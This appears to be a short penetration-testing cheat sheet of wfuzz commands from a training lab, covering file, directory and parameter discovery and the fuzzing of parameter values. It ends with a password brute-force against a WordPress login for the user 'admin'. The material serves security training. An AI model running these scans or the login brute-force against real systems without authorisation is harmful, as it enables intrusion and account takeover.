# File Discovery
`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"`

# Directory Discovery
`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 "$URL"`

# Parameter Discovery
# To perform this type of check, we'll need to review the Wfuzz output for any valid response size changes, which would indicate the presence of a hidden parameter. If there are no valid changes in response size, we're in the clear and can expect no potentially hidden parameters. However, there may be such parameters if we perform a parameter discovery attempt using the below wordlist and encounter a change in average response size.
`wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"`

# Fuzzing Parameter Values
`wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://offsecwp:80/index.php?fpv=FUZZ`
# We quickly notice that there are a lot of erroneous responses with our parameter values (specifically the 301 response code). To exclude these erroneous responses from our Wfuzz output, we will also add the --hc option with a value of a 301.
`wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ`

# Fuzzing POST Requests
`wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php`
# --hh parameter to suppress the response size value of 7201 bytes
`wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" --hh 7201 "$URL"`